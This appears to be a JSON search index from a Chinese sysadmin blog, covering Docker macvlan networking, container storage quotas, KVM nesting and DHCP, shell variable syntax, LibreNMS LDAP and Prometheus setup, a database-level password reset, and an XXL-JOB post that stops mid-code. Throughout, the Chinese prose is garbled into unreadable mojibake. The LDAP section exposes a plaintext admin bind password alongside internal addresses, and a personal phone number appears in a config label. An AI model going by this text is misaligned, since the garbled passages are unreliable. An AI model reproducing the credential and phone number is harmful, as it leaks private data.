ä¼šçœ‹åˆ°\n1... 2\u0026#34;Config\u0026#34;: [ 3 { 4 \u0026#34;Subnet\u0026#34;: \u0026#34;172.18.31.0/24\u0026#34;, 5 \u0026#34;Gateway\u0026#34;: \u0026#34;172.18.31.254\u0026#34; 6 } 7 ] äºŒã€æŒ‰æŒ‡å®šipå»ºç«‹å®¹å™¨\n1docker run --rm -dit --name=t35 --net macvlan0 --ip=172.18.31.35 alpine:latest ash éšåæˆ‘ä»¬å¯ä»¥ç”¨docker execå–å¾—shell\n1docker exec -it t35 ash 2ip a 3ping 172.18.31.35 4ping 172.18.31.2 æ³¨æ„ï¼šè¿™ä¸ªæ—¶å€™ä»å®¿ä¸»æœºpingå®¹å™¨ ping 172.18.31.35ï¼Œæˆ–è€…æ˜¯ä»å®¹å™¨pingå®¿ä¸»æœº ping 172.18.31.33ï¼Œéƒ½æ˜¯ä¸é€šçš„ï¼Œè¿™æ˜¯macvlançš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¿…é¡»åšä¸ªæ“ä½œæ¥è§£å†³è¿™ä¸ªé—®é¢˜\nä¸‰ã€è§£å†³å®¿ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„ç½‘ç»œé—®é¢˜\nç»™eth0åšä¸ªå­æ¥å£ï¼Œè§£å†³å®¿ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„é€šè®¯é—®é¢˜\n1ip link add macvlan0-shim link eth0 type macvlan mode bridge 2ip addr add 172.18.31.34/32 dev macvlan0-shim 3ip link set macvlan0-shim up 4ip route add 172.18.31.0/24 dev macvlan0-shim è¿™æ ·å°±å¯ä»¥é€šäº†\næ³¨æ„ï¼Œè¿™æ ·å®¿ä¸»æœºå äº†ä¸¤ä¸ªIPï¼Œeth0å­æ¥å£çš„ipä¸èƒ½èƒ¡ä¹±ï¼Œå¿…é¡»è·Ÿç‹¬ç«‹ipåŒæ®µã€‚ æµªè´¹äº†ä¸€ä¸ªIPï¼Œä½†æ˜¯è§£å†³äº†å®¿ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„ç½‘ç»œé—®é¢˜ã€‚\n","date":"2023-12-14","img":"","permalink":"https://rendoumi.com/posts/20231214-lxc_ip/","series":null,"tags":null,"title":"LXCæ›´æ–°åˆ°Dockerä¹‹åçš„IPéƒ¨åˆ†ä¿®æ”¹"},{"categories":null,"content":"åœ¨k8sæ²¡æœ‰å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬ç”¨çš„å°±æ˜¯LXCï¼Œå¤æ—©ç‰ˆæœ¬äº†ã€‚\né‚£æ—¶å€™æ˜¯1ï¼š60çš„è™šæ‹Ÿï¼Œä¸€å°ç‰©ç†æœºä¸Šè·‘60ä¸ªLXCï¼Œå±…ç„¶è¿™æ ·è¿è¡Œäº†8å¹´æ— å¼‚å¸¸ï¼Œç°åœ¨è¦å‡çº§ä¸€ä¸‹äº†ã€‚\né‚£æ—¶å€™çš„LXCï¼Œå­˜å‚¨ç©ºé—´æ— æ³•å•ç‹¬è®¾å®šï¼ˆç¼ºçœ10Gï¼‰ï¼Œcpuå’Œmemçš„limitä¹Ÿæœ‰è¿™æ ·é‚£æ ·çš„é—®é¢˜ã€‚\nè¿›åŒ–åˆ°æ–°ç‰ˆæœ¬çš„Dockeråï¼Œå­˜å‚¨éƒ¨åˆ†ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œæˆ‘ä»¬é‡‡ç”¨overlay2ï¼š\n1docker info 2 3... 4 Storage Driver: overlay2 5 Backing Filesystem: xfs 6 Supports d_type: true 7 Native Overlay Diff: true 8... ç¼ºçœçš„å°±æ˜¯overlay2å’Œxfs\nä¸€ã€ä¿®æ”¹bootå†…æ ¸å¯åŠ¨å‚æ•°\n1vi /etc/default/grub 2 3#åŠ ä¸Šrootflags=uquota,pquota 4GRUB_CMDLINE_LINUX=\u0026#34;console=tty0 crashkernel=auto net.ifnames=0 console=ttyS0 rootflags=uquota,pquota\u0026#34; 5 6#æ›´æ–° 7grub2-mkconfig -o /boot/grub2/grub.cfg 8 9#é‡å¯ 10reboot äºŒã€æ£€éªŒå¹¶å¯åŠ¨å®¹å™¨\n1cat /proc/mounts |grep vda 2/dev/vda1 / xfs rw,relatime,attr2,inode64,usrquota,prjquota 0 0 æœ‰prjquotaå³å¯\næŒ‰éœ€å¯åŠ¨å®¹å™¨ï¼ŒæŒ‡å®šç©ºé—´å¤§å°ï¼Œsize=2G\n1docker run --rm -dit --name=t36 --storage-opt size=2G --net macvlan0 --ip=172.18.31.36 alpine:latest ash 2 3docker exec -it t36 ash 4df -h è¿™æ ·å°±å¯ä»¥å•ç‹¬é™åˆ¶å®¹å™¨çš„å¤§å°äº†ã€‚\n","date":"2023-12-14","img":"","permalink":"https://rendoumi.com/posts/20231214-lxc_storage/","series":null,"tags":null,"title":"LXCæ›´æ–°åˆ°Dockerä¹‹åçš„å­˜å‚¨éƒ¨åˆ†ä¿®æ”¹"},{"categories":null,"content":"kvmç”Ÿäº§çš„è™šæœºå†…ä»ç„¶å¯ä»¥å†äº§è™šæ‹Ÿæœºï¼Œè¿™å°±æ˜¯åµŒå¥—è™šæ‹ŸåŒ–\næˆ‘ä»¬çš„ç›®çš„æ˜¯è¦å†kvmè™šæœºä¸­å®‰è£…ä¸€å¥—proxmoxçš„ç³»ç»Ÿ\né¦–å…ˆåœ¨å®ä½“æœºä¸Šæ£€æŸ¥å½“å‰çš„Linuxæ˜¯å¦æ”¯æŒåµŒå¥—\n1Intelçš„CPU 2cat /sys/module/kvm_intel/parameters/nested 3 4AMDçš„CPU 5cat /sys/module/kvm_amd/parameters/nested â€‹\tä¿®æ”¹æ”¯æŒï¼Œä»¥intelä¸ºä¾‹ï¼š\n1vi /etc/modprobe.d/kvm.conf 2options kvm_intel nested=1 rebootå°±å¥½\nä¸é‡å¯çš„è¯ï¼Œå¯ä»¥å…ˆå¸è½½æ¨¡å—ï¼Œç„¶åé‡æ–°åŠ è½½\n1modprobe -r kvm_intel 2modprobe kvm_intel ç„¶åæ£€æŸ¥ä¸€ä¸‹\n1cat /sys/module/kvm_intel/parameters/nested proxmoxå®‰è£…çš„æ—¶å€™ï¼ŒæŒ‡å®šcpu=hostï¼š\n1#!/bin/sh 2qemu-img create -f qcow2 /export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2 200G 3virt-install \\ 4 --name=proxmox-168-86-103 \\ 5 --cpu=host \\ 6 --ram=8192 \\ 7 --disk path=/export/kvm/proxmox-168-86-103/proxmox-168-86-103.qcow2,format=qcow2,size=200 \\ 8 --cdrom=/export/kvm/iso/proxmox-ve_7.0-2.iso \\ 9 --os-type=Linux \\ 10 --network bridge=br0 \\ 11 --vnc --vnclisten=0.0.0.0 --vncport=5903 ","date":"2023-12-14","img":"","permalink":"https://rendoumi.com/posts/20231214-kvm_nested/","series":null,"tags":null,"title":"KVMçš„åµŒå¥—è™šæ‹ŸåŒ–"},{"categories":null,"content":"ç¼ºçœæƒ…å†µä¸‹kvmä¼šä¿ç•™ä¸€ä¸ªnatçš„ç½‘ç»œï¼Œip aå‘½ä»¤æŸ¥çœ‹ï¼Œä¼šçœ‹åˆ°virbr0å’Œvirbr0-nic\n18: virbr0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UNKNOWN 2 link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff 3 inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0 49: virbr0-nic: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN qlen 500 5 link/ether 52:54:00:6c:22:2c brd ff:ff:ff:ff:ff:ff è¿™ä¸ªå¦‚æœè™šæœºéƒ½æ˜¯é™æ€IPï¼Œä¸”ä¸åšNATçš„è¯ï¼Œåˆ™æ— å¿…è¦ä¿ç•™ï¼Œå¯ä»¥å½»åº•åˆ æ‰ã€‚\nkvmåˆ é™¤æ‰ç¼ºçœç½‘ç»œ\n1virsh net-destroy default 2virsh net-undefine default é‚£ä¹ˆå¦‚æœéç”¨ä¸å¯ï¼Œè¿˜éœ€è¦ç»™ç‰¹å®šè™šæœºç”¨dhcpæŒ‡å®šå›ºå®šIP æ–¹æ³•å¦‚ä¸‹ï¼š\næŸ¥çœ‹ç¼ºçœç½‘ç»œ\n1$ virsh net-list 2 Name State Autostart Persistent 3---------------------------------------------------------- 4 default active yes yes æ‰¾å‡ºè™šæœºçš„macåœ°å€\n1$ virsh dumpxml vis-16-10-33 | grep -i \u0026#39;\u0026lt;mac\u0026#39; 2 \u0026lt;mac address=\u0026#39;f0:00:ac:10:0a:21\u0026#39;/\u0026gt; ç¼–è¾‘ç½‘ç»œ\n1$ virsh net-edit default 2 3\u0026lt;network\u0026gt; 4 \u0026lt;name\u0026gt;default\u0026lt;/name\u0026gt; 5 \u0026lt;uuid\u0026gt;58e86841-ef4b-4d63-bf4f-7888515b8474\u0026lt;/uuid\u0026gt; 6 \u0026lt;forward mode=\u0026#39;nat\u0026#39;/\u0026gt; 7 \u0026lt;bridge name=\u0026#39;virbr0\u0026#39; stp=\u0026#39;on\u0026#39; delay=\u0026#39;0\u0026#39; /\u0026gt; 8 \u0026lt;mac address=\u0026#39;52:54:00:6C:22:2C\u0026#39;/\u0026gt; 9 \u0026lt;ip address=\u0026#39;192.168.122.1\u0026#39; netmask=\u0026#39;255.255.255.0\u0026#39;\u0026gt; 10 \u0026lt;dhcp\u0026gt; 11 \u0026lt;range start=\u0026#39;192.168.122.2\u0026#39; end=\u0026#39;192.168.122.254\u0026#39; /\u0026gt; 12 \u0026lt;/dhcp\u0026gt; 13 \u0026lt;/ip\u0026gt; 14\u0026lt;/network\u0026gt; åœ¨rangeä¸‹é¢æ¥ä¸€åˆ—\n1 \u0026lt;dhcp\u0026gt; 2 \u0026lt;range start=\u0026#39;192.168.122.2\u0026#39; end=\u0026#39;192.168.122.254\u0026#39; /\u0026gt; 3\t\u0026lt;host mac=\u0026#39;f0:00:ac:10:0a:21\u0026#39; name=\u0026#39;vis-16-10-33\u0026#39; ip=\u0026#39;192.168.122.10\u0026#39;/\u0026gt; 4 \u0026lt;/dhcp\u0026gt; ä¿å­˜é€€å‡ºï¼Œé‡å¯ç½‘ç»œ\n1$ virsh net-destroy default 2$ virsh net-start default ç„¶åå°±å¯ä»¥äº†ã€‚\n","date":"2023-12-14","img":"","permalink":"https://rendoumi.com/posts/20231214-kvm_dhcp/","series":null,"tags":null,"title":"KVMç½‘ç»œå¦‚ä½•è®¾ç½®DHCP"},{"categories":null,"content":"å˜é‡å­ä¸²\n${var} è¿”å›å˜é‡varçš„å†…å®¹ï¼Œå•ç‹¬ä½¿ç”¨æ—¶æœ‰æ²¡æœ‰{}ä¸€æ ·ï¼Œæ··åˆå¤šä¸ªå˜é‡å’Œå¸¸é‡æ—¶ï¼Œç”¨{}ç•Œå®šå˜é‡å\n${#var} è¿”å›å˜é‡varå†…å®¹çš„é•¿åº¦\n${var:offset} ä»å˜é‡varä¸­çš„åç§»é‡offsetå¼€å§‹æˆªå–åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„å­å­—ç¬¦ä¸²ï¼Œoffsetä»0å¼€å§‹\n${var:offset:length} ä»å˜é‡varä¸­çš„åç§»é‡offsetå¼€å§‹æˆªå–é•¿åº¦ä¸ºlengthçš„å­å­—ç¬¦ä¸²\n${var#*.} ä»å˜é‡varä¸­åˆ é™¤ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦\n${var##*.} ä»å˜é‡varä¸­åˆ é™¤æœ€åä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å·¦è¾¹çš„æ‰€æœ‰å­—ç¬¦\n${var%.*} ä»å˜é‡varä¸­åˆ é™¤æœ€åä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å³è¾¹çš„æ‰€æœ‰å­—ç¬¦\n${var%%.*} ä»å˜é‡varä¸­åˆ é™¤ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç‚¹ï¼ˆ.ï¼‰åŠå…¶å³è¾¹çš„æ‰€æœ‰å­—ç¬¦\nç¤ºä¾‹ï¼š\n1var=file.txt.tar.gz 2${var#*.} #å†…å®¹ä¸º\u0026#34;txt.tar.gz\u0026#34; 3${var##*.} #å†…å®¹ä¸º\u0026#34;gz\u0026#34; 4${var%.*} #å†…å®¹ä¸º\u0026#34;file.txt.tar\u0026#34; 5${var%%.*} #å†…å®¹ä¸º\u0026#34;file\u0026#34; ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶å®ƒPatternå’Œè¡¨è¾¾å¼ï¼Œç¤ºä¾‹ï¼š\n1var=/home/xxx/aaa/file.txt #å‡è®¾xxxä¸ºå½“å‰ç”¨æˆ· 2 3# ä»è·¯å¾„ä¸­è·å–æ–‡ä»¶å 4${var##*/} #å†…å®¹ä¸º\u0026#34;file.txt\u0026#34; 5 6# å°†ç»å¯¹è·¯å¾„è½¬ä¸ºç›¸å¯¹è·¯å¾„ 7# whoamiæ˜¯è·å–å½“å‰ç”¨æˆ·åï¼Œä½¿ç”¨$()æ‰§è¡Œå­shellï¼Œ$(whoami)å°†å¾—åˆ°xxx 8~${var#*$(whoami)} #å†…å®¹ä¸º\u0026#34;~/aaa/file.txt\u0026#34; ${var/pattern/string} ä½¿ç”¨stringä»£æ›¿ç¬¬ä¸€ä¸ªåŒ¹é…çš„pattern\n${var//pattern/string} ä½¿ç”¨stringä»£æ›¿æ‰€æœ‰åŒ¹é…çš„pattern\n${var,} é¦–å­—æ¯è½¬å°å†™\n${var,,} å…¨éƒ¨è½¬å°å†™\n${var^} é¦–å­—æ¯è½¬å¤§å†™\n${var^^} å…¨éƒ¨è½¬å¤§å†™\nç‰¹æ®Šæ‰©å±•å˜é‡\n${var-word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\n${var:-word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\n${var+word} å¦‚æœå˜é‡varæœ‰å€¼ï¼ˆåŒ…æ‹¬ç©ºä¸²\u0026quot;\u0026quot;ï¼‰ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\n1var1=foo 2var2= 3${var1-word} # å†…å®¹ä¸º\u0026#34;foo\u0026#34; 4echo ${var2-word} # å†…å®¹ä¸º\u0026#34;\u0026#34; 5echo ${var2:-word} # å†…å®¹ä¸º\u0026#34;word\u0026#34; ${var:+word} å¦‚æœå˜é‡varæœ‰å€¼ä¸”ä¸ä¸ºç©ºï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²word\n${var=word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²wordï¼Œå¹¶ä¸ºvarèµ‹å€¼ä¸ºå­—ç¬¦ä¸²word\n${var:=word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºä¸²ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²wordï¼Œå¹¶ä¸ºvarèµ‹å€¼ä¸ºå­—ç¬¦ä¸²word\n${var?word} å¦‚æœå˜é‡varæœªèµ‹å€¼ï¼Œå°†å­—ç¬¦ä¸²wordä½œä¸ºæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå¦åˆ™è¿”å›å˜é‡varçš„å€¼\n${var:?word} å¦‚æœå˜é‡varæœªèµ‹å€¼æˆ–è€…å€¼ä¸ºç©ºä¸²ï¼Œå°†å­—ç¬¦ä¸²wordä½œä¸ºæ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œå¦åˆ™è¿”å›å˜é‡varçš„å€¼\næ•°ç»„\narray=(1 2 3 a b c) å®šä¹‰ä¸€ä¸ªåä¸ºarrayçš„æ•°ç»„ï¼ŒåŒ…å«äº†6ä¸ªå…ƒç´ ï¼Œå…ƒç´ å­—æ®µç±»å‹ä¸éœ€è¦ç»Ÿä¸€\n${array[index]} è®¿é—®æ•°ç»„ä¸­çš„å…ƒç´ ï¼Œindexä»0å¼€å§‹ï¼Œå¦‚æœä¸ºè´Ÿè¡¨ç¤ºä»æ•°ç»„çš„æœ«å°¾å¼€å§‹çš„åç§»é‡\n${array[*]} è·å–æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ \n${array[@]} è·å–æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ \n${#array[*]} è·å–æ•°ç»„çš„é•¿åº¦\n${#array[@]} è·å–æ•°ç»„çš„é•¿åº¦\n${!array[@]} è·å–æ•°ç»„ç´¢å¼•åˆ—è¡¨ï¼Œè¿”å› 0 1 2 3 4 5\narray+=(4 d) å‘æ•°ç»„ä¸­æ·»åŠ å…ƒç´ ï¼Œæ•°ç»„å†…å®¹ä¸º 1 2 3 a b c 4 d\nunset array[6] åˆ é™¤ç¬¬ 7 ä¸ªå…ƒç´ ï¼Œæ•°ç»„å†…å®¹ä¸º 1 2 3 a b c d\nunset array[-1] åˆ é™¤å€’æ•°ç¬¬ 1 ä¸ªå…ƒç´ ï¼Œæ•°ç»„å†…å®¹ä¸º 1 2 3 a b c\nå¤šè¡Œå­—ç¬¦ä¸²å˜é‡\n1var=$(cat \u0026lt;\u0026lt;- \u0026#39;EOF\u0026#39; 2line1 3line2 4... 5EOF) æˆ–è€…ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·ï¼ˆå•å¼•å·ä¸­${}å’Œ$()ç­‰éƒ½ä¸ä¼šå–è¡¨è¾¾å¼çš„å€¼ï¼ŒåŒå¼•å·ä¸­æ‰ä¼šï¼‰ï¼š\n1var=\u0026#39;line1 2line2 3...\u0026#39; æ³¨æ„ä¸Šè¿°ä¸¤ç§å†™æ³•çš„å·®åˆ«ï¼Œé¿å…ä¸ºå˜é‡å†…å®¹å¸¦æ¥ä¸å¿…è¦çš„ç©ºè¡Œã€‚é€šè¿‡å¾ªç¯å¯ä¾æ¬¡å¾—åˆ°å˜é‡ä¸­çš„æ¯ä¸€è¡Œï¼š\n1while read -r line; do 2echo $line 3done \u0026lt;\u0026lt;\u0026lt; $var Shellç³»ç»Ÿå˜é‡\n$1 è¡¨ç¤ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ$2 è¡¨ç¤ºç¬¬äºŒä¸ªå‚æ•° \u0026hellip;\n$# å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°\n$0 å½“å‰Shellè„šæœ¬ç¨‹åºçš„åç§°\n$? å‰ä¸€ä¸ªå‘½ä»¤æˆ–å‡½æ•°çš„è¿”å›ç \n$* ä»¥ \u0026ldquo;å‚æ•°1 å‚æ•°2 \u0026hellip; \u0026quot; å½¢å¼è·å–æ‰€æœ‰å‚æ•°\n$@ ä»¥ \u0026ldquo;å‚æ•°1\u0026rdquo; \u0026ldquo;å‚æ•°2\u0026rdquo; \u0026hellip; å½¢å¼è·å–æ‰€æœ‰å‚æ•°\n$$ æœ¬ç¨‹åºçš„è¿›ç¨‹IDï¼Œå³PID\n$! ä¸Šä¸€ä¸ªå‘½ä»¤çš„PID\n$PPID çˆ¶è¿›ç¨‹çš„PID\n$UID æ‰§è¡Œè¿™ä¸ªè„šæœ¬çš„å½“å‰ç”¨æˆ·ID\nå˜é‡è¾“å‡º\nå˜é‡å†…å®¹çš„è¾“å‡ºä½¿ç”¨ echo å‘½ä»¤ã€‚\nå¦‚æœæœªä½¿ç”¨ echoï¼Œåˆ™ä¼šå°†å˜é‡å†…å®¹å½“æˆ Shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¸¸ç”¨äºè°ƒç”¨æŸä¸ªç¨‹åºå¹¶ä¼ é€’å‚æ•°ï¼Œå¦‚ï¼šåº”ç”¨ç¨‹åºå¯åŠ¨è„šæœ¬ã€‚\n","date":"2023-12-13","img":"","permalink":"https://rendoumi.com/posts/20231212-shell/","series":null,"tags":null,"title":"Shellä¸­å˜é‡ã€å­—ç¬¦ä¸²ã€æ•°ç»„ã€å‚æ•°çš„æŠ€å·§"},{"categories":null,"content":"æˆ‘ä»¬openldapä¸­ç”¨æˆ·å’Œç»„çš„è®¾ç½®\n1ç”¨æˆ·ï¼š 2ou=People,dc=ddky,dc=com 3#uid;#givenName;#sn;#uidNumber;#gidNumber 4 5ç»„ï¼š 6ou=group,dc=ddky,dc=com 7#cn;#gidNumber;#memberUID;#description åˆ°librenmsä¸­ï¼Œ 172.18.31.10\n1cd /opt/librenms 2vi config.php 3$config[\u0026#39;auth_mechanism\u0026#39;] = \u0026#39;ldap\u0026#39;; 4$config[\u0026#39;auth_ldap_server\u0026#39;] = \u0026#39;172.18.31.27\u0026#39;; 5$config[\u0026#39;auth_ldap_port\u0026#39;] = 389; 6$config[\u0026#39;auth_ldap_starttls\u0026#39;] = False; // Disable TLS on port 389 7$config[\u0026#39;auth_ldap_binddn\u0026#39;] = \u0026#39;cn=admin,dc=ddky,dc=com\u0026#39;; // overrides binduser 8$config[\u0026#39;auth_ldap_bindpassword\u0026#39;] = \u0026#39;nishiwode\u0026#39;; 9$config[\u0026#39;auth_ldap_prefix\u0026#39;] = \u0026#39;cn=\u0026#39;; 10$config[\u0026#39;auth_ldap_suffix\u0026#39;] = \u0026#39;,ou=People,dc=ddky,dc=com\u0026#39;; // appended to usernames 11$config[\u0026#39;auth_ldap_groupbase\u0026#39;] = \u0026#39;ou=group,dc=ddky,dc=com\u0026#39;; // all groups must be inside this 12$config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;admins\u0026#39;][\u0026#39;level\u0026#39;] = 10; // set admins group to admin level 13$config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;pfy\u0026#39;][\u0026#39;level\u0026#39;] = 5; // set pfy group to global read only level 14$config[\u0026#39;auth_ldap_groups\u0026#39;][\u0026#39;support\u0026#39;][\u0026#39;level\u0026#39;] = 1; // set support group as a normal user 15$config[\u0026#39;auth_ldap_debug\u0026#39;] = false; // enable for verbose debug messages è¯´æ˜ï¼š æˆ‘ä»¬çš„openldapå› ä¸ºæ˜¯å†…éƒ¨ä½¿ç”¨ï¼Œæ‰€ä»¥æ— æ³•è®¾ç½®è¯ä¹¦ï¼ŒTLSæ˜¯è¢«ç¦æ­¢çš„ã€‚ openldapæ˜¯ç¦æ­¢anonymousç”¨æˆ·æŸ¥è¯¢çš„ï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®binddnå’Œbindpassword å®é™…ç”¨æˆ·æ˜¯cn=zhangranrui,ou=People,dc=ddky,dc=comï¼Œæ‰€ä»¥è¦è®¾prefix librenmsç¼ºçœç”¨æˆ·æœ‰ä¸‰ä¸ªçº§åˆ«ï¼Œ10 5 1ï¼Œå¯¹åº”çš„ç”¨æˆ·ç»„æ˜¯admins pfy support\nå¦‚æœè¦å¯¹æ¥å…¶ä»–ç³»ç»Ÿï¼Œä¹Ÿè®¸éƒ½éœ€è¦å¦‚æ³•ç‚®åˆ¶\n","date":"2023-12-13","img":"","permalink":"https://rendoumi.com/posts/20231213-librenms_ldap/","series":null,"tags":null,"title":"Librenmsä½¿ç”¨ldapè®¤è¯ç”¨æˆ·"},{"categories":null,"content":"librenmsæ˜¯ä¸ªéå¸¸å¼ºæ‚çš„å·¥å…·ï¼Œå¯¹ç½‘ç»œä¸æ¸…æ¥šçš„å¯ä»¥é€è¿‡è¿™ä¸ªå·¥å…·ï¼Œå¯¹ç½‘ç»œç¯å¢ƒæœ‰æ¸…æ™°çš„äº†è§£ã€‚\nå¦‚ä½•é€šè¿‡prometheuså¯¹librenmsè¿›è¡Œé›†æˆå‘¢ï¼Ÿ\nä¸€ã€è£…pushgateway\n1wget https://github.com/prometheus/pushgateway/releases/download/v1.2.0/pushgateway-1.2.0.linux-amd64.tar.gz 2 3æŠŠpushgatewayæ”¾åˆ°/usr/local/bin 4 5cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt;/etc/systemd/system/pushgateway.service 6[Unit] 7Description=Codis Exporter 8Wants=network-online.target 9After=network-online.target 10 11[Service] 12Type=simple 13ExecStart=/usr/local/bin/pushgateway --web.listen-address=:50004 14 15[Install] 16WantedBy=multi-user.target 17EOF 18 19systemctl daemon-relaod 20systemctl enable --now pushgateway.service äºŒã€é…ç½®librenms\n1cd /opt/librenms 2vi config.php 3$config[\u0026#39;prometheus\u0026#39;][\u0026#39;enable\u0026#39;] = true; 4$config[\u0026#39;prometheus\u0026#39;][\u0026#39;url\u0026#39;] = \u0026#39;http://127.0.0.1:50004\u0026#39;; 5$config[\u0026#39;prometheus\u0026#39;][\u0026#39;job\u0026#39;] = \u0026#39;librenms\u0026#39;; # Optional ä¸‰ã€é…ç½®prometheus\n1- job_name: \u0026#39;librenms\u0026#39; 2 scrape_interval: 300s 3 honor_labels: true 4 static_configs: 5 - targets: [\u0026#39;172.18.31.10:50004\u0026#39;] 6 labels: 7 sms_to: \u0026#39;18618197196\u0026#39; é¦–å…ˆè®¿é—®prometheusï¼Œhttp://172.18.31.8:9090/targets\nè¿™æ ·å¼„å¥½åï¼Œå†è®¿é—® http://172.18.31.10:50004/metrics\né‡Œé¢çš„ä¸œè¥¿æ˜¯ååˆ†ç™«ç‹‚çš„ï¼Œä»äº¤æ¢æœºç«¯å£åˆ°F5ï¼Œåº”æœ‰å°½æœ‰\nä¸œè¥¿æ”¶è¿›prometheusåï¼Œå¯ä»¥é€šè¿‡grafanaå¯¹å„ç§æŒ‡æ ‡è¿›è¡Œç”»å›¾å’ŒæŠ¥è­¦\n","date":"2023-12-13","img":"","permalink":"https://rendoumi.com/posts/20231213-librenms_prometheus/","series":null,"tags":null,"title":"Librenmsé›†æˆè¿›prometheus"},{"categories":null,"content":"librenmså¯¹å¯†ç çš„å¼ºåº¦æœ‰è¦æ±‚ï¼Œå¿…é¡»ä½¿ç”¨éå¸¸å¤æ‚çš„å¯†ç ç­–ç•¥æ‰èƒ½æ»¡è¶³è¦æ±‚. è¿™å°±é¬¼ç•œäº†ï¼Œæƒ³æ”¹æˆè‡³å°‘èƒ½è®°å¾—ä½çš„å¯†ç ã€‚\nå¦‚ä½•å¼ºåˆ¶ä¿®æ”¹å‘¢ï¼Ÿ\né¦–å…ˆå¼„ä¸€æ®µphpç¨‹åºæ¥ç”ŸæˆåŠ å¯†ä¸²ï¼š\n\u0026lt;?php\recho password_hash(\u0026quot;xxxxxxxx\u0026quot;, PASSWORD_DEFAULT);\r?\u0026gt;\rè¿è¡Œåå¾—åˆ°åŠ å¯†çš„å­—ç¬¦ä¸²ï¼š\n$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6\ræˆ–è€…ç›´æ¥åˆ°ä¸‹é¢çš„ç½‘ç«™æ¥ç”Ÿæˆï¼š\nhttps://phppasswordhash.com/ ç„¶åç™»å½•librenmsçš„æœºå™¨, 172.18.31.10\nmysql -uroot -p\ruse librenms;\rselect * from users;\rupdate users set password='$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6' where user_id=1;\rè¿™æ ·å°±å¼ºåˆ¶æŠŠå¯†ç ä¿®æ”¹æˆè‡ªå·±ä¹ æƒ¯çš„äº†ã€‚\n","date":"2023-12-13","img":"","permalink":"https://rendoumi.com/posts/20231213-librenms_password/","series":null,"tags":null,"title":"Librenmså¼ºåˆ¶ä¿®æ”¹å¯†ç "},{"categories":null,"content":"æ•°æ®åº“ç®¡ç†å‘˜æœ‰ä¸ªç‰¹æ®Šçš„éœ€æ±‚ï¼š\néœ€è¦ä¸€ä¸ªmsyqlå®¢æˆ·ç«¯ï¼Œå¯ä»¥å®šæ—¶å»è¿æ¥mysqlæœåŠ¡å™¨æ‰§è¡ŒSQLè¯­å¥ã€‚ä¸”å¯ä»¥è‡ªå·±åŠ¨æ€ç¼–è¾‘SQLè¯­å¥ã€‚\næ‰¾æ¥æ‰¾å»ï¼Œæ•°æ®åº“ç®¡ç†å‘˜å¯¹spring javaè¿™ç±»ä¸œè¥¿å§ä¸€æ— æ‰€çŸ¥ï¼Œä½†æ˜¯é€šæ™“SQLï¼Œè¿™ç§æƒ…å½¢XXL-JOBçš„EXECUTORä»£ä½æ‰§è¡Œå°±æ¯”è¾ƒé€‚åˆã€‚\nä¸»æ§åœ°å€ï¼šhttp://172.18.31.13/xxl-job-admin/\nä½¿ç”¨å¾ˆç®€å•ï¼Œæˆ‘ä»¬åœ¨172.18.31.14è£…ä¸€ä¸ªè¢«æ§ç«¯çš„executorï¼Œè¿è¡Œæ¨¡å¼é€‰æ‹©GLUE(Java)æ¨¡å¼ï¼ŒGLUEæ¨¡å¼å°±å¯ä»¥éšä¾¿ç¼–è¾‘ JAVA+SQLæºä»£ç äº†ã€‚è®¾ç½®æ‰§è¡Œé¢‘ç‡æ˜¯æ¯30åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚\né€‰æ‹©GLUEæ¨¡å¼åï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨GLUE IDEé‡Œç¼–è¾‘ä»£ç ï¼š\nä»£ç å¦‚ä¸‹ï¼š æ³¨ï¼šåœ¨172.18.31.14ä¸Šé¢å·²ç»è£…äº†ä¸€ä¸ªMySQLæœåŠ¡ç«¯ï¼Œæœ‰ä¸€ä¸ªuseråº“ã€‚\n1package com.xxl.job.service.handler; 2 3import com.xxl.job.core.context.XxlJobHelper; 4import com.xxl.job.core.handler.IJobHandler; 